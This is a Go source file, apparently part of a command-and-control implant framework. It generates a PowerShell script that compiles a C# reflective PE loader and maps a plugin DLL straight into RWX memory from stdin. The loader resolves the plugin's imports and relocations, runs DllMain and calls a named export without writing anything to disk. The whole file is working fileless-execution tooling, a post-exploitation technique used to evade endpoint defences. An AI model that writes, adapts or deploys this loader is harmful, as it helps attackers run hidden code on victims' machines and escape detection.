package main

import (
	"fmt"
	"strings"
)

// pluginPowershellHostScript renders the PowerShell plugin host for
// memory-hosted sessions: the child reads the standard length-prefixed
// plugin frame from stdin (plugin bytes and input, never a file), manually
// maps the PE32+ amd64 image with an Add-Type compiled C# mapper — the
// loading model the loader chain established for streaming agent bytes into
// PowerShell — and invokes the shared Run export ABI. The copy-of-self
// child implements the identical contract, so the operator surfaces and the
// parent-side result parsing are unchanged. The export name rides a
// single-quoted literal and is pattern-validated before rendering, so it
// cannot escape its scope.
func pluginPowershellHostScript(exportName string) string {
	var script strings.Builder
	fmt.Fprintf(&script, "$ErrorActionPreference = 'Stop'\n")
	fmt.Fprintf(&script, "$exportName = '%s'\n", powerShellSingleQuote(exportName))
	script.WriteString(`try {
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Runtime.InteropServices;
public static class P {
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern IntPtr LoadLibraryA(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr m, IntPtr n);
    static ushort W(byte[] b, int o) { return (ushort)(b[o] | b[o + 1] << 8); }
    static uint U(byte[] b, int o) { return (uint)(b[o] | b[o + 1] << 8 | b[o + 2] << 16 | b[o + 3] << 24); }
    static ulong K(byte[] b, int o) { ulong v = 0; for (int i = 7; i >= 0; i--) v = v << 8 | b[o + i]; return v; }
    static int Raw(byte[] b, int e, int os, uint rva) {
        int s = e + 24 + os; int n = W(b, e + 6);
        for (int i = 0; i < n; i++, s += 40) {
            uint va = U(b, s + 12), rs = U(b, s + 16), ro = U(b, s + 20);
            if (rs > 0 && rva >= va && rva < va + rs) return (int)(ro + rva - va);
        }
        return -1;
    }
    static string Name(byte[] b, int o) {
        int n = o; while (n < b.Length && b[n] != 0) n++;
        if (n == o) return null;
        return System.Text.Encoding.ASCII.GetString(b, o, n - o);
    }
    delegate int DllMain(IntPtr h, uint reason, IntPtr l);
    delegate int RunExport(IntPtr input, IntPtr output, int outputCap);
    // Map copies the PE headers and every raw-backed section into one image
    // allocation, applies DIR64 relocations, resolves imports, and runs
    // DLL_PROCESS_ATTACH — the manual-mapper contract the copy-of-self
    // plugin child implements, without any file on disk.
    static IntPtr Map(byte[] b) {
        if (b.Length < 0x40 || b[0] != 0x4D || b[1] != 0x5A) throw new Exception("plugin payload is not a Windows executable");
        int e = (int)U(b, 0x3c);
        if (e + 24 >= b.Length || U(b, e) != 0x4550) throw new Exception("plugin image has no PE header");
        if (W(b, e + 4) != 0x8664 || W(b, e + 24) != 0x20B) throw new Exception("plugin PE must be PE32+ amd64");
        int os = W(b, e + 20);
        uint image = U(b, e + 24 + 56), headers = U(b, e + 24 + 60);
        if (image == 0 || headers == 0 || headers > image || (long)headers > b.Length) throw new Exception("plugin has invalid PE header size");
        IntPtr g = VirtualAlloc(IntPtr.Zero, image, 0x3000, 0x40);
        if (g == IntPtr.Zero) throw new Exception("VirtualAlloc for the plugin image failed");
        Marshal.Copy(b, 0, g, (int)headers);
        int n = W(b, e + 6); int s = e + 24 + os;
        for (int i = 0; i < n; i++, s += 40) {
            uint vs = U(b, s + 8), va = U(b, s + 12), rs = U(b, s + 16), ro = U(b, s + 20);
            if (rs == 0 || va == 0 || va >= image) continue;
            uint len = (vs > 0 && vs < rs) ? vs : rs;
            if (va + len > image) len = image - va;
            if ((long)ro + (long)len > b.Length) throw new Exception("plugin section data is truncated");
            Marshal.Copy(b, (int)ro, new IntPtr(g.ToInt64() + va), (int)len);
        }
        long delta = g.ToInt64() - (long)U(b, e + 24 + 24);
        if (delta != 0) {
            uint dir = U(b, e + 24 + 152), dsz = U(b, e + 24 + 156);
            if (dir == 0 || dsz == 0) throw new Exception("plugin PE cannot be rebased: it has no base relocations");
            int o = Raw(b, e, os, dir);
            if (o < 0) throw new Exception("plugin relocation table is outside the file");
            long end = o + (long)dsz;
            while (o + 8 <= end) {
                uint page = U(b, o), sz = U(b, o + 4);
                if (sz < 8 || o + (long)sz > end) throw new Exception("plugin has a malformed relocation table");
                for (int i = 8; i + 2 <= sz; i += 2) {
                    ushort t = W(b, o + i);
                    if ((t >> 12) == 10) { IntPtr p = new IntPtr(g.ToInt64() + page + (t & 0xFFF)); Marshal.WriteInt64(p, Marshal.ReadInt64(p) + delta); }
                    else if ((t >> 12) != 0) throw new Exception("plugin uses unsupported relocation type " + (t >> 12));
                }
                o += (int)sz;
            }
        }
        uint idir = U(b, e + 24 + 120);
        if (idir != 0) {
            int o = Raw(b, e, os, idir);
            if (o < 0) throw new Exception("plugin import table is outside the file");
            for (int d = o; d + 20 <= b.Length; d += 20) {
                uint nrva = U(b, d + 12), ft = U(b, d + 16);
                if (nrva == 0 && ft == 0) break;
                if (nrva == 0 || ft == 0) throw new Exception("plugin has a malformed import descriptor");
                int no = Raw(b, e, os, nrva);
                if (no < 0) throw new Exception("plugin import name is outside the file");
                string dllName = Name(b, no);
                IntPtr m = LoadLibraryA(dllName);
                if (m == IntPtr.Zero) throw new Exception("plugin dependency " + dllName + " is unavailable");
                uint trva = U(b, d); if (trva == 0) trva = ft;
                for (uint i = 0; ; i++) {
                    int to = Raw(b, e, os, trva + i * 8);
                    if (to < 0 || to + 8 > b.Length) throw new Exception("plugin import thunks are outside the file");
                    ulong t = K(b, to);
                    if (t == 0) break;
                    IntPtr a; string fn;
                    if ((t >> 63) == 1) { fn = "ordinal " + (t & 0xFFFF); a = GetProcAddress(m, new IntPtr((long)(t & 0xFFFF))); }
                    else {
                        int ho = Raw(b, e, os, (uint)t);
                        if (ho < 2) throw new Exception("plugin import names are outside the file");
                        fn = Name(b, ho + 2);
                        if (fn == null) throw new Exception("plugin import names are truncated");
                        a = GetProcAddress(m, fn);
                    }
                    if (a == IntPtr.Zero) throw new Exception("plugin import " + dllName + "!" + fn + " could not be resolved");
                    Marshal.WriteIntPtr(new IntPtr(g.ToInt64() + (long)ft + (long)i * 8), a);
                }
            }
        }
        uint entry = U(b, e + 24 + 16);
        if (entry != 0) {
            DllMain dm = (DllMain)Marshal.GetDelegateForFunctionPointer(new IntPtr(g.ToInt64() + entry), typeof(DllMain));
            if (dm(g, 1, IntPtr.Zero) == 0) throw new Exception("plugin DllMain rejected DLL_PROCESS_ATTACH");
        }
        return g;
    }
    // Find walks the mapped image's export table by name and rejects
    // forwarded exports, mirroring the agent's own manual mapper.
    static IntPtr Find(byte[] b, IntPtr g, string export) {
        int e = (int)U(b, 0x3c); int os = W(b, e + 20);
        uint dir = U(b, e + 24 + 112), dsz = U(b, e + 24 + 116);
        if (dir == 0) throw new Exception("plugin exports no functions");
        int eo = Raw(b, e, os, dir);
        if (eo < 0 || eo + 40 > b.Length) throw new Exception("plugin export directory is outside the file");
        uint numFunctions = U(b, eo + 20), numNames = U(b, eo + 24);
        if (numNames == 0 || numNames > 0x100000) throw new Exception("plugin has an invalid export table");
        int funcOff = Raw(b, e, os, U(b, eo + 28));
        int nameOff = Raw(b, e, os, U(b, eo + 32));
        int ordOff = Raw(b, e, os, U(b, eo + 36));
        if (funcOff < 0 || nameOff < 0 || ordOff < 0) throw new Exception("plugin export tables are outside the file");
        for (int i = 0; i < numNames; i++) {
            int no = Raw(b, e, os, U(b, nameOff + i * 4));
            if (no < 0) throw new Exception("plugin export names are outside the file");
            if (Name(b, no) != export) continue;
            uint ordinal = W(b, ordOff + i * 2);
            if (ordinal >= numFunctions) throw new Exception("plugin has an invalid export ordinal");
            uint funcRva = U(b, funcOff + (int)ordinal * 4);
            if (funcRva == 0) throw new Exception("plugin export is null");
            if (funcRva >= dir && funcRva < dir + dsz) throw new Exception("forwarded plugin exports are unsupported");
            return new IntPtr(g.ToInt64() + funcRva);
        }
        throw new Exception("plugin export " + export + " was not found");
    }
    public static string Invoke(string export, int cap) {
        byte[] b; byte[] input;
        using (BinaryReader r = new BinaryReader(Console.OpenStandardInput())) {
            uint pl = r.ReadUInt32(), il = r.ReadUInt32();
            if (pl == 0 || pl > 512 * 1024 * 1024 || il > 4096) throw new Exception("invalid plugin frame sizes");
            b = r.ReadBytes((int)pl);
            input = r.ReadBytes((int)il);
            if (b.Length != pl || input.Length != il) throw new Exception("plugin frame is truncated");
        }
        IntPtr g = Map(b);
        IntPtr proc = Find(b, g, export);
        RunExport run = (RunExport)Marshal.GetDelegateForFunctionPointer(proc, typeof(RunExport));
        IntPtr inputPtr = Marshal.StringToHGlobalAnsi(System.Text.Encoding.ASCII.GetString(input));
        IntPtr outputPtr = Marshal.AllocHGlobal(cap);
        try {
            byte[] zeroed = new byte[cap];
            Marshal.Copy(zeroed, 0, outputPtr, cap);
            int code = run(inputPtr, outputPtr, cap);
            string result = Marshal.PtrToStringAnsi(outputPtr);
            if (code != 0) throw new Exception("plugin export " + export + " failed with code " + code + (string.IsNullOrEmpty(result) ? "" : ": " + result));
            return result;
        } finally {
            Marshal.FreeHGlobal(inputPtr);
            Marshal.FreeHGlobal(outputPtr);
        }
    }
}
'@
    [Console]::Out.Write([P]::Invoke($exportName, 16777216))
    exit 0
} catch {
    [Console]::Error.Write($_.Exception.Message)
    exit 1
}
`)
	return script.String()
}
